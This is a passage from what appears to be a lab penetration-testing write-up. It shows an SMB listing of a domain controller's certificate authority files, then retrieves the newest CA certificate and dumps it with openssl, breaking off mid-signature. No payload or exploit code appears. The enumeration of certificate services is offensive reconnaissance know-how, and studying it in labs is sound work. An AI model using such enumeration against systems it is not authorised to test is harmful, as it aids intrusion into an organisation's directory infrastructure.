+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:22:11 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>14-15<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:51:40 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>15<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:22:11 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>15-14<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:22:12 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>15-16<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 23:53:40 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>16<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:22:12 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>16-15<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:51:26 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>16-17<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:23:15 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>17<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:51:26 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>17-16<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:51:26 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>17-18<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:24:51 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>18<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:51:26 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>18-17<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:51:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>18-19<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Tue Jun  <span style=color:#ae81ff>3</span> 04:26:51 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>19<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:51:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>19-18<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:34:59 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>19-20<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>15</span> 01:53:03 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>2<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>15</span> 07:18:44 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>2-1<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:41:29 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>2-3<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:52:43 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>20<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:34:59 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>20-19<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:34:59 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>20-21<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:54:47 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>21<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:34:59 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>21-20<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:34:59 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>21-22<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 06:56:47 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>22<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:34:59 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>22-21<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:02:35 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>22-23<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:36:17 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>23<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:02:35 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>23-22<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:02:35 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>23-24<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:38:20 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>24<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:02:35 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>24-23<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:02:35 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>24-25<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 07:40:21 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>25<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:02:35 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>25-24<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>25-26<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:04:01 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>26<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>26-25<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>26-27<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:05:56 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>27<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>27-26<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>27-28<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Wed Jun  <span style=color:#ae81ff>4</span> 08:07:56 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>28<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1391</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:24:27 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>28-27<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:25:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>29<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>15</span> 07:21:57 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>3<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:41:29 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>3-2<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:41:29 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>3-4<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:27:37 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>30<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Jul  <span style=color:#ae81ff>3</span> 10:29:36 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>31<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>15</span> 07:24:12 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>4<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:41:30 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>4-3<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:36:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>4-5<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:43:51 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>5<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:36:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>5-4<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:36:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>5-6<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:44:59 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>6<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:36:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>6-5<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:36:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>6-7<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Sun Sep <span style=color:#ae81ff>29</span> 03:46:59 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>7<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:36:39 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>7-6<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:56:48 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>7-8<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:40:45 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>8<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:56:48 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>8-7<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:56:48 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>8-9<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>924</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:42:44 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>9<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:56:48 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>9-10<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-       <span style=color:#ae81ff>1390</span>  Thu Apr <span style=color:#ae81ff>10</span> 02:56:48 <span style=color:#ae81ff>2025</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>9-8<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>885</span>  Fri Sep <span style=color:#ae81ff>13</span> 04:50:51 <span style=color:#ae81ff>2024</span> DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA.crt
+</span></span><span style=display:flex><span>-rw-rw-rw-        <span style=color:#ae81ff>331</span>  Fri Sep <span style=color:#ae81ff>13</span> 09:17:59 <span style=color:#ae81ff>2024</span> nsrev_cicada-DC-JPQ225-CA.asp
+</span></span></code></pre></div><p>Getting the most recent certificate:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>&gt; get DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#f92672>(</span>31<span style=color:#f92672>)</span>.crt
+</span></span><span style=display:flex><span>└──╼ $openssl x509 -in DC-JPQ225.cicada.vl_cicada-DC-JPQ225-CA<span style=color:#ae81ff>\(</span>31<span style=color:#ae81ff>\)</span>.crt -text -noout
+</span></span><span style=display:flex><span>Certificate:
+</span></span><span style=display:flex><span>    Data:
+</span></span><span style=display:flex><span>        Version: <span style=color:#ae81ff>3</span> <span style=color:#f92672>(</span>0x2<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        Serial Number:
+</span></span><span style=display:flex><span>            16:23:75:bb:bb:4c:e5:b0:48:87:bc:bb:c0:87:dd:d1
+</span></span><span style=display:flex><span>        Signature Algorithm: sha256WithRSAEncryption
+</span></span><span style=display:flex><span>        Issuer: DC <span style=color:#f92672>=</span> vl, DC <span style=color:#f92672>=</span> cicada, CN <span style=color:#f92672>=</span> cicada-DC-JPQ225-CA
+</span></span><span style=display:flex><span>        Validity
+</span></span><span style=display:flex><span>            Not Before: Jul  <span style=color:#ae81ff>3</span> 16:19:28 <span style=color:#ae81ff>2025</span> GMT
+</span></span><span style=display:flex><span>            Not After : Jul  <span style=color:#ae81ff>3</span> 16:29:28 <span style=color:#ae81ff>2525</span> GMT
+</span></span><span style=display:flex><span>        Subject: DC <span style=color:#f92672>=</span> vl, DC <span style=color:#f92672>=</span> cicada, CN <span style=color:#f92672>=</span> cicada-DC-JPQ225-CA
+</span></span><span style=display:flex><span>        Subject Public Key Info:
+</span></span><span style=display:flex><span>            Public Key Algorithm: rsaEncryption
+</span></span><span style=display:flex><span>                Public-Key: <span style=color:#f92672>(</span><span style=color:#ae81ff>2048</span> bit<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>                Modulus:
+</span></span><span style=display:flex><span>                    00:dd:d0:75:49:65:02:13:6f:fb:e4:6f:56:5f:3a:
+</span></span><span style=display:flex><span>                    99:ec:77:db:f5:a9:0b:02:37:1d:44:dd:fa:48:6a:
+</span></span><span style=display:flex><span>                    b2:6a:30:58:9e:d6:b1:f1:26:a1:d5:ff:78:ed:91:
+</span></span><span style=display:flex><span>                    a8:0d:1e:eb:79:70:45:7a:58:3e:dc:bc:8f:98:cd:
+</span></span><span style=display:flex><span>                    99:89:77:0f:2e:87:9f:6f:0c:5a:36:33:5c:c2:48:
+</span></span><span style=display:flex><span>                    48:ae:ce:5a:2f:4f:73:b6:a6:aa:21:6f:c8:7f:40:
+</span></span><span style=display:flex><span>                    e6:e3:23:f6:22:d0:fc:79:ab:51:fa:66:84:c5:a6:
+</span></span><span style=display:flex><span>                    8e:08:0d:aa:48:72:49:6f:ac:cf:6c:92:f2:41:a0:
+</span></span><span style=display:flex><span>                    fc:25:33:e4:73:c9:0c:c0:dd:53:b8:4c:91:64:ab:
+</span></span><span style=display:flex><span>                    2b:3a:ed:15:89:3f:dd:cd:89:90:26:39:b1:4d:68:
+</span></span><span style=display:flex><span>                    b6:4c:46:0c:fe:b0:e3:1e:fd:13:4d:39:67:2c:1a:
+</span></span><span style=display:flex><span>                    63:e9:25:9e:a9:f5:8c:18:67:79:d4:58:87:94:1f:
+</span></span><span style=display:flex><span>                    09:e0:da:2b:f5:74:ef:d8:7b:eb:7d:5d:86:b3:38:
+</span></span><span style=display:flex><span>                    49:5e:16:7f:79:a8:bd:4e:95:ed:f9:a2:bc:d4:0a:
+</span></span><span style=display:flex><span>                    7e:c5:1d:c7:be:76:31:af:da:c4:6d:fc:0c:c4:20:
+</span></span><span style=display:flex><span>                    37:1f:c5:46:de:69:38:e6:da:74:a7:83:33:63:64:
+</span></span><span style=display:flex><span>                    bf:94:d5:bf:2d:dc:e4:b0:e2:18:e5:53:89:56:be:
+</span></span><span style=display:flex><span>                    2e:3d
+</span></span><span style=display:flex><span>                Exponent: <span style=color:#ae81ff>65537</span> <span style=color:#f92672>(</span>0x10001<span style=color:#f92672>)</span>
+</span></span><span style=display:flex><span>        X509v3 extensions:
+</span></span><span style=display:flex><span>            X509v3 Key Usage: 
+</span></span><span style=display:flex><span>                Digital Signature, Certificate Sign, CRL Sign
+</span></span><span style=display:flex><span>            X509v3 Basic Constraints: critical
+</span></span><span style=display:flex><span>                CA:TRUE
+</span></span><span style=display:flex><span>            X509v3 Subject Key Identifier: 
+</span></span><span style=display:flex><span>                A2:FD:0C:95:BF:13:0D:99:D3:B5:0B:D2:B4:F5:90:71:C6:E9:9C:91
+</span></span><span style=display:flex><span>            1.3.6.1.4.1.311.21.1: 
+</span></span><span style=display:flex><span>                .....
+</span></span><span style=display:flex><span>            1.3.6.1.4.1.311.21.2: 
+</span></span><span style=display:flex><span>                ..<span style=color:#ae81ff>\.</span>,. ...<span style=color:#f92672>[</span>.....<span style=color:#e6db74>&#34;t*~.z
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Signature Algorithm: sha256WithRSAEncryption
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Signature Value:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        2d:68:ba:5a:00:16:df:6d:5e:e2:d0:57:98:c9:33:c1:20:4b:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        34:8a:47:55:e3:66:7d:8e:0c:2a:ad:09:4f:be:b4:d5:2e:51:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        09:1c:af:6a:58:0c:1e:d5:dd:34:47:08:66:d9:b1:d1:52:46:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        57:27:06:a6:7f:b3:0e:54:39:0b:a7:e5:37:14:30:91:4f:10:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        b5:44:f5:05:c5:dc:1f:85:2f:f6:bd:c4:fc:36:d3:58:dc:1a:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        45:7e:10:92:aa:f1:6f:cc:fe:2b:1d:2f:04:98:5e:59:b0:05:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        e8:da:3e:81:fb:e6:44:46:7b:aa:a7:ce:7e:0e:4c:36:89:e4:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        32:5e:0a:49:ef:89:02:48:b0:b2:b7:6e:99:45:74:dc:2a:88:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        2a:2e:5f:90:dc:9b:93:fb:0f:9d:ff:03:4c:6b:71:10:28:ef:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        15:03:0e:d2:e9:1c:a5:9e:ba:25:c7:8e:32:37:94:25:de:65:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        f2:79:6d:e2:b3:49:c9:16:8c:69:49:ef:cb:a5:7c:40:f4:d7:
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>        61:32:d9:4b:0c:45:6c:1b:0f:b0:d1:34:9d:c2:d3:ed:99:09:
